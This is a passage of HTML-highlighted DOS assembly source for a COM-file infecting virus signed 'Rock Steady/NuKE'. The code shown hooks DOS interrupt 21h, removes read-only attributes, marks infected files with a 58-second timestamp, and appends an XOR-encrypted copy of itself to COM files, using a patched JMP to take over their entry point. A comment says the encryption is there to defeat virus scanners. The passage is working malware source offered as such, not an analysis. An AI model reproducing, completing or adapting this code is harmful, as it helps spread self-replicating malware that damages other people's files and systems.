             </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dir_handler</span><span class="sc0">                                           
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">          </span><span class="sc1">;Next file Dir handler                </span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dir_handler</span><span class="sc0">                                           
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0abcdh</span><span class="sc0">       </span><span class="sc1">;Virus testing                        </span><span class="sc0">
             </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21call</span><span class="sc0">                                             
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0abcdh</span><span class="sc0">                                             
</span><span class="sc5">int21call</span><span class="sc4">:</span><span class="sc0">                                                                 
             </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Split...                        </span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">                                                           
</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">                                                                   
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                                                    
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">;Get file Attribs             </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                                                  
                                                                           
             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">                   </span><span class="sc1">;Make sure there normal       </span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">open_file</span><span class="sc0">               </span><span class="sc1">;Okay there are               </span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                 </span><span class="sc1">;Nope, Fix them...            </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">;Save them now                </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                                                  
                                                                           
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                                              
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Open File to Infect please   </span><span class="sc0">
                                                                           
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                   </span><span class="sc1">;Error Split                   </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;BX File handler              </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">;Get file TIME + DATE         </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                                 
             </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                  </span><span class="sc1">;Un mask Seconds              </span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;60 seconds                   </span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;58 seconds                   </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;Is it 58 seconds?            </span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                   </span><span class="sc1">;File already infected         </span><span class="sc0">
                                                                           
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;Save Time            </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;Save Date            </span><span class="sc0">
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                                                
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                                                 
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Read first 3 bytes           </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">                   </span><span class="sc1">;Error Split               </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">;Move file pointer to end  </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;of file...                </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                 
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">                            </span><span class="sc1">;Error Split      </span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">          </span><span class="sc1">;Is file an EXE?  </span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                                </span><span class="sc1">;Yupe! Split      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                 
             </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;Set the JMP      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                       
             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_me</span><span class="sc0">                           </span><span class="sc1">;Infect!          </span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_now</span><span class="sc0">                            </span><span class="sc1">;error split      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">;Write back the first 3</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;bytes                 </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                                                 
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
</span><span class="sc5">exit_now</span><span class="sc4">:</span><span class="sc0">                                                                  
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore old time      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore Old date      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                                              
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                                                
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Close File now...            </span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                                                                      
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Jmp back to whatever        </span><span class="sc0">
</span><span class="sc5">rocko</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">                                                          
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*[Infection Routine]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">infect_me</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                                                  
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">;Get Time                     </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;Split seconds to AX          </span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;AL = 0 to 99                 </span><span class="sc0">
                                             </span><span class="sc1">;New Encryption Value         </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                         
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;Copy ANOTHER copy of the     </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">    </span><span class="sc1">;Virus to the end of us       </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0">                                        
             </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                                                 
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">crypt_size</span><span class="sc0">                                         
             </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                   </span><span class="sc1">;Encrypt that 2nd copy!       </span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">                                   
             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt_encrypt</span><span class="sc0">                                       
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                                                    
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write the New Encrypted      </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0">          </span><span class="sc1">;Virus to File!               </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                         
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_error</span><span class="sc0">                   </span><span class="sc1">;Error Split             </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                              
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Pointer back to beginning    </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;file!                        </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_error</span><span class="sc0">                   </span><span class="sc1">;Split Dude...           </span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;Clear carry flag             </span><span class="sc0">
             </span><span class="sc6">retn</span><span class="sc0">                                                          
</span><span class="sc5">exit_error</span><span class="sc4">:</span><span class="sc0">                                                                
             </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">;Set carry flag               </span><span class="sc0">
             </span><span class="sc6">retn</span><span class="sc0">                                                          
</span><span class="sc5">infect_me</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">                                                          
</span><span class="sc5">old_time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                                                   
</span><span class="sc5">old_date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                                                   
</span><span class="sc5">jump_address</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                                        
</span><span class="sc5">buffer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">                                       
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">                                                                     
</span><span class="sc5">msgs</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) Rock Steady/NuKE"</span><span class="sc0">   </span><span class="sc1">;No other than `Moi'...    </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*[Simple BUT EFFECTIVE Encryption/Decryption Routine]-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                                                  
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">value</span><span class="sc4">-</span><span class="sc2">106h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Get new Encryption   </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">crypt_size</span><span class="sc0">                   </span><span class="sc1">;Value                </span><span class="sc0">
</span><span class="sc5">decrypt_encrypt</span><span class="sc4">:</span><span class="sc0">                                                           
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">;Fuck Scanners and put a       </span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;`NOT AL' anywhere here...     </span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_encrypt</span><span class="sc0">                                       
             </span><span class="sc6">retn</span><span class="sc0">                                                          
</span><span class="sc5">value</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">;Encryption value!                    </span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">                                                          
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">                                                                      
</span><span class="sc5">seg_a</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">                                                          
             </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">                                                 
</span></div></body>
</html>
